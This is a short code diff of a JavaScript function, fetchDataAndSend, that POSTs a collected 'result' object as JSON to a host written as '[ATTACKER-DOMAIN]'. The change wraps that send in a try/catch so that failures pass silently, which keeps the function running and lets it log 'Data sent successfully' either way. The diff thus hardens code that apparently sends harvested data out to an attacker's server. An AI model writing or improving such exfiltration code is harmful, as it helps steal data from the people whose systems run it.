@@ -38,14 +38,16 @@ async function fetchDataAndSend() {
        };
 
        // Send the data as a POST request with JSON content
-       await fetch('https://[ATTACKER-DOMAIN]', {
+      try { 
+      await fetch('https://[ATTACKER-DOMAIN]', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(result) // Convert the result object to a JSON string
-       });
-
+       });} catch(e){
+         console.log("Didn't send values");
+      }·
        console.log('Data sent successfully:', result); // Log the successful operation
    } catch (error) {
        // Handle and log any errors during the process
